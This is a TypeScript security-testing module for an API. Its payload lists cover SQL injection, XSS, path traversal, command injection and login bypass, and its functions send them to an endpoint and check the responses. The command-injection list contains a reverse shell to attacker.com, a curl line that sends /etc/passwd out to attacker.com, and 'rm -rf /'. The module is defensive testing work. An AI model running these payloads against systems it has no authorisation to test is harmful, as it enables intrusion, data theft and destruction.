/**
 * Core Security Testing Utilities
 * Essential security testing tools and attack simulation framework
 *
 * Phase 2: API Security Testing Utilities
 * - Attack simulation and payload generation
 * - Input validation testing
 * - Authentication bypass detection
 * - Core security assertions
 */

import { z } from 'zod'

// Security test result schemas
export const SecurityTestResultSchema = z.object({
  testName: z.string(),
  category: z.enum([
    'AUTHENTICATION',
    'AUTHORIZATION',
    'INPUT_VALIDATION',
    'INJECTION',
    'XSS',
    'CSRF',
    'RATE_LIMITING',
  ]),
  status: z.enum(['PASS', 'FAIL', 'WARNING', 'ERROR']),
  severity: z.enum(['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']),
  details: z.string(),
  evidence: z.array(z.string()).optional(),
  recommendations: z.array(z.string()).optional(),
  executionTime: z.number(),
  timestamp: z.date(),
})

export const SecurityScanResultSchema = z.object({
  overallScore: z.number().min(0).max(100),
  vulnerabilityCount: z.number(),
  testResults: z.array(SecurityTestResultSchema),
  summary: z.object({
    critical: z.number(),
    high: z.number(),
    medium: z.number(),
    low: z.number(),
  }),
  recommendations: z.array(z.string()),
  scanDuration: z.number(),
  timestamp: z.date(),
})

export type SecurityTestResult = z.infer<typeof SecurityTestResultSchema>
export type SecurityScanResult = z.infer<typeof SecurityScanResultSchema>

/**
 * Core Attack Simulation Framework
 */
export class AttackSimulator {
  private results: SecurityTestResult[] = []

  /**
   * SQL Injection payload generator
   */
  generateSQLInjectionPayloads(): string[] {
    return [
      // Basic SQL injection
      "'; DROP TABLE users; --",
      "' OR 1=1 --",
      "' OR '1'='1",
      "' UNION SELECT * FROM admin --",

      // Time-based blind SQL injection
      "'; WAITFOR DELAY '00:00:05' --",
      "'; SELECT pg_sleep(5) --",

      // Boolean-based blind SQL injection
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --",

      // Error-based SQL injection
      "' AND (SELECT * FROM (SELECT COUNT(*),concat(0x7e,(SELECT database()),0x7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

      // Advanced payloads
      "'; INSERT INTO admin_users VALUES ('hacker', 'password'); --",
      "' OR (SELECT user FROM mysql.user WHERE user = 'root') = 'root' --",
      "'; EXEC xp_cmdshell('ping attacker-server.com'); --",
    ]
  }

  /**
   * XSS payload generator
   */
  generateXSSPayloads(): string[] {
    return [
      // Basic XSS
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',

      // Event-based XSS
      '<input onfocus="alert(1)" autofocus>',
      '<textarea onfocus="alert(1)" autofocus>',
      '<body onload="alert(1)">',

      // Filter bypass attempts
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      "javascript:alert('XSS')",

      // Advanced payloads
      '<iframe src="javascript:alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',

      // Data URI XSS
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ]
  }

  /**
   * Path traversal payload generator
   */
  generatePathTraversalPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/proc/self/environ',
      '/proc/version',
      'C:\\boot.ini',
      'C:\\windows\\system32\\config\\system',
    ]
  }

  /**
   * Command injection payload generator
   */
  generateCommandInjectionPayloads(): string[] {
    return [
      '; ls -la',
      '&& whoami',
      '| cat /etc/passwd',
      '`ping -c 3 attacker.com`',
      '$(ping -c 3 attacker.com)',
      '; ping -c 3 attacker.com; echo',
      '| nc -e /bin/sh attacker.com 1337',
      '; rm -rf / --no-preserve-root',
      '&& curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)',
      '|| powershell -c "Get-Process"',
    ]
  }

  /**
   * Authentication bypass payload generator
   */
  generateAuthBypassPayloads(): { username: string; password: string }[] {
    return [
      { username: "admin' --", password: 'anything' },
      { username: "admin' OR '1'='1' --", password: 'password' },
      { username: "' OR 1=1 --", password: '' },
      { username: 'admin', password: "' OR '1'='1" },
      { username: "admin'; DROP TABLE users; --", password: 'password' },
      { username: 'admin', password: "password' OR '1'='1' --" },
      { username: '', password: "' OR 1=1 #" },
      { username: "' UNION SELECT 'admin', 'password' --", password: '' },
    ]
  }

  /**
   * Test SQL injection vulnerability
   */
  async testSQLInjection(endpoint: string, parameter: string): Promise<SecurityTestResult> {
    const startTime = performance.now()
    const payloads = this.generateSQLInjectionPayloads()
    const vulnerabilities: string[] = []

    for (const payload of payloads) {
      try {
        const url = new URL(endpoint)
        url.searchParams.set(parameter, payload)

        const response = await fetch(url.toString())
        const responseText = await response.text()

        // Check for SQL error messages
        const sqlErrorPatterns = [
          /SQL syntax.*error/i,
          /mysql_fetch_array/i,
          /ORA-\d+/i,
          /Microsoft.*ODBC.*SQL Server/i,
          /PostgreSQL.*ERROR/i,
          /SQLite.*error/i,
          /Warning.*mysql_/i,
        ]

        for (const pattern of sqlErrorPatterns) {
          if (pattern.test(responseText)) {
            vulnerabilities.push(`SQL error exposed with payload: ${payload}`)
          }
        }

        // Check for successful injection indicators
        if (response.status === 500 && responseText.includes('database')) {
          vulnerabilities.push(`Database error triggered with payload: ${payload}`)
        }
      } catch (error) {
        // Network errors might indicate successful attack
        if (error instanceof Error && error.message.includes('network')) {
          vulnerabilities.push(`Network disruption with payload: ${payload}`)
        }
      }
    }

    const executionTime = performance.now() - startTime

    return {
      testName: 'SQL Injection Test',
      category: 'INJECTION',
      status: vulnerabilities.length > 0 ? 'FAIL' : 'PASS',
      severity: vulnerabilities.length > 0 ? 'HIGH' : 'LOW',
      details:
        vulnerabilities.length > 0
          ? `Found ${vulnerabilities.length} potential SQL injection vulnerabilities`
          : 'No SQL injection vulnerabilities detected',
      evidence: vulnerabilities,
      recommendations:
        vulnerabilities.length > 0
          ? [
              'Use parameterized queries or prepared statements',
              'Implement input validation and sanitization',
              'Apply principle of least privilege to database accounts',
              'Enable SQL query logging and monitoring',
            ]
          : [],
      executionTime,
      timestamp: new Date(),
    }
  }

  /**
   * Test XSS vulnerability
   */
  async testXSS(endpoint: string, parameter: string): Promise<SecurityTestResult> {
    const startTime = performance.now()
    const payloads = this.generateXSSPayloads()
    const vulnerabilities: string[] = []

    for (const payload of payloads) {
      try {
        const url = new URL(endpoint)
        url.searchParams.set(parameter, payload)

        const response = await fetch(url.toString())
        const responseText = await response.text()

        // Check if payload is reflected without encoding
        if (responseText.includes(payload)) {
          vulnerabilities.push(`XSS payload reflected: ${payload}`)
        }

        // Check for script execution indicators
        if (responseText.includes('<script>') && !responseText.includes('&lt;script&gt;')) {
          vulnerabilities.push(`Script tags not properly encoded with payload: ${payload}`)
        }
      } catch (_error) {
        // Continue with next payload
      }
    }

    const executionTime = performance.now() - startTime

    return {
      testName: 'Cross-Site Scripting (XSS) Test',
      category: 'XSS',
      status: vulnerabilities.length > 0 ? 'FAIL' : 'PASS',
      severity: vulnerabilities.length > 0 ? 'HIGH' : 'LOW',
      details:
        vulnerabilities.length > 0
          ? `Found ${vulnerabilities.length} potential XSS vulnerabilities`
          : 'No XSS vulnerabilities detected',
      evidence: vulnerabilities,
      recommendations:
        vulnerabilities.length > 0
          ? [
              'Implement proper output encoding/escaping',
              'Use Content Security Policy (CSP) headers',
              'Validate and sanitize all user inputs',
              'Use framework-provided XSS protection features',
            ]
          : [],
      executionTime,
      timestamp: new Date(),
    }
  }

  /**
   * Test authentication bypass
   */
  async testAuthenticationBypass(loginEndpoint: string): Promise<SecurityTestResult> {
    const startTime = performance.now()
    const payloads = this.generateAuthBypassPayloads()
    const vulnerabilities: string[] = []

    for (const payload of payloads) {
      try {
        const response = await fetch(loginEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: payload.username,
            password: payload.password,
          }),
        })

        // Check for successful authentication indicators
        if (response.status === 200) {
          const responseData = await response.json()
          if (responseData.success || responseData.token || responseData.sessionId) {
            vulnerabilities.push(`Authentication bypassed with: ${JSON.stringify(payload)}`)
          }
        }
      } catch (_error) {
        // Continue with next payload
      }
    }

    const executionTime = performance.now() - startTime

    return {
      testName: 'Authentication Bypass Test',
      category: 'AUTHENTICATION',
      status: vulnerabilities.length > 0 ? 'FAIL' : 'PASS',
      severity: vulnerabilities.length > 0 ? 'CRITICAL' : 'LOW',
      details:
        vulnerabilities.length > 0
          ? `Found ${vulnerabilities.length} authentication bypass vulnerabilities`
          : 'No authentication bypass vulnerabilities detected',
      evidence: vulnerabilities,
      recommendations:
        vulnerabilities.length > 0
          ? [
              'Use parameterized queries for authentication',
              'Implement proper password hashing (bcrypt, scrypt)',
              'Add account lockout mechanisms',
              'Enable multi-factor authentication',
              'Log and monitor authentication attempts',
            ]
          : [],
      executionTime,
      timestamp: new Date(),
    }
  }

  /**
   * Get all test results
   */
  getResults(): SecurityTestResult[] {
    return [...this.results]
  }

  /**
   * Clear test results
   */
  clearResults(): void {
    this.results = []
  }

  /**
   * Add test result
   */
  addResult(result: SecurityTestResult): void {
    this.results.push(result)
  }
}

/**
 * Security Payload Generator
 */
export class SecurityPayloadGenerator {
  /**
   * Generate fuzzing payloads for input validation testing
   */
  generateFuzzingPayloads(): string[] {
    return [
      // Empty and null values
      '',
      'null',
      'undefined',

      // Extremely long strings
      'A'.repeat(10000),
      'A'.repeat(100000),

      // Special characters
      '!@#$%^&*()_+-=[]{}|;:,.<>?',
      '~`!@#$%^&*()_+-=[]{}\\|;:\'",.<>?/',

      // Unicode and encoding
      'ÅÇÇÉæøå',
      '测试数据',
      '🚀🔥💻🎉',

      // Control characters
      '\x00\x01\x02\x03\x04\x05',
      '\n\r\t\b\f',

      // Format strings
      '%s%s%s%s',
      '%x%x%x%x',
      '%n%n%n%n',

      // Buffer overflow attempts
      `A${'B'.repeat(1024)}`,
      '\x41'.repeat(2048),
    ]
  }

  /**
   * Generate payloads for specific vulnerability types
   */
  generateVulnerabilityPayloads(
    type: 'SQL' | 'XSS' | 'PATH_TRAVERSAL' | 'COMMAND_INJECTION'
  ): string[] {
    const simulator = new AttackSimulator()

    switch (type) {
      case 'SQL':
        return simulator.generateSQLInjectionPayloads()
      case 'XSS':
        return simulator.generateXSSPayloads()
      case 'PATH_TRAVERSAL':
        return simulator.generatePathTraversalPayloads()
      case 'COMMAND_INJECTION':
        return simulator.generateCommandInjectionPayloads()
      default:
        return []
    }
  }
}

/**
 * Security Assertions Helper
 */
export class SecurityAssertions {
  /**
   * Assert that response doesn't contain sensitive information
   */
  static assertNoSensitiveData(response: string): { passed: boolean; findings: string[] } {
    const sensitivePatterns = [
      // Credentials
      /password\s*[:=]\s*["']?[^"\s]+/gi,
      /api[_-]?key\s*[:=]\s*["']?[^"\s]+/gi,
      /secret\s*[:=]\s*["']?[^"\s]+/gi,
      /token\s*[:=]\s*["']?[^"\s]+/gi,

      // Database info
      /connection\s*string/gi,
      /database\s*[:=]\s*["']?[^"\s]+/gi,

      // System info
      /\/etc\/passwd/gi,
      /\/proc\/version/gi,
      /C:\\windows\\system32/gi,

      // Stack traces
      /at\s+[\w.]+\([^)]+:\d+:\d+\)/gi,
      /Exception\s+in\s+thread/gi,
    ]

    const findings: string[] = []

    for (const pattern of sensitivePatterns) {
      const matches = response.match(pattern)
      if (matches) {
        findings.push(...matches)
      }
    }

    return {
      passed: findings.length === 0,
      findings,
    }
  }

  /**
   * Assert that response has proper security headers
   */
  static assertSecurityHeaders(headers: Headers): { passed: boolean; missing: string[] } {
    const requiredHeaders = [
      'Content-Security-Policy',
      'X-Content-Type-Options',
      'X-Frame-Options',
      'X-XSS-Protection',
      'Strict-Transport-Security',
    ]

    const missing: string[] = []

    for (const header of requiredHeaders) {
      if (!headers.has(header)) {
        missing.push(header)
      }
    }

    return {
      passed: missing.length === 0,
      missing,
    }
  }

  /**
   * Assert that input validation is working
   */
  static assertInputValidation(
    _input: string,
    response: Response,
    expectedStatus = 400
  ): { passed: boolean; details: string } {
    if (response.status !== expectedStatus) {
      return {
        passed: false,
        details: `Expected status ${expectedStatus} for malicious input, got ${response.status}`,
      }
    }

    return {
      passed: true,
      details: 'Input validation working correctly',
    }
  }
}

/**
 * Security Test Data Factory
 */
export class SecurityTestDataFactory {
  /**
   * Create test user data with various edge cases
   */
  static createTestUsers(): Array<{
    username: string
    email: string
    password: string
    expectValid: boolean
  }> {
    return [
      // Valid users
      {
        username: 'testuser',
        email: 'test@example.com',
        password: 'SecurePass123!',
        expectValid: true,
      },
      {
        username: 'admin',
        email: 'admin@company.com',
        password: 'AdminPass456!',
        expectValid: true,
      },

      // Invalid/malicious users
      {
        username: "admin'; DROP TABLE users; --",
        email: 'hacker@evil.com',
        password: 'password',
        expectValid: false,
      },
      {
        username: '<script>alert("xss")</script>',
        email: 'xss@test.com',
        password: 'password',
        expectValid: false,
      },
      { username: 'user', email: 'not-an-email', password: 'weak', expectValid: false },
      { username: '', email: 'empty@test.com', password: 'password', expectValid: false },
      {
        username: 'A'.repeat(1000),
        email: 'long@test.com',
        password: 'password',
        expectValid: false,
      },
    ]
  }

  /**
   * Create test repository data with security edge cases
   */
  static createTestRepositories(): Array<{
    name: string
    description: string
    expectValid: boolean
  }> {
    return [
      // Valid repositories
      { name: 'test-repo', description: 'A test repository', expectValid: true },
      { name: 'my-awesome-project', description: 'An awesome project', expectValid: true },

      // Invalid/malicious repositories
      {
        name: "repo'; DROP TABLE repositories; --",
        description: 'SQL injection attempt',
        expectValid: false,
      },
      { name: '<script>alert("xss")</script>', description: 'XSS attempt', expectValid: false },
      { name: '', description: 'Empty name', expectValid: false },
      { name: 'A'.repeat(1000), description: 'Too long name', expectValid: false },
    ]
  }
}

// Export all utilities
export const securityUtils = {
  AttackSimulator,
  SecurityPayloadGenerator,
  SecurityAssertions,
  SecurityTestDataFactory,
}
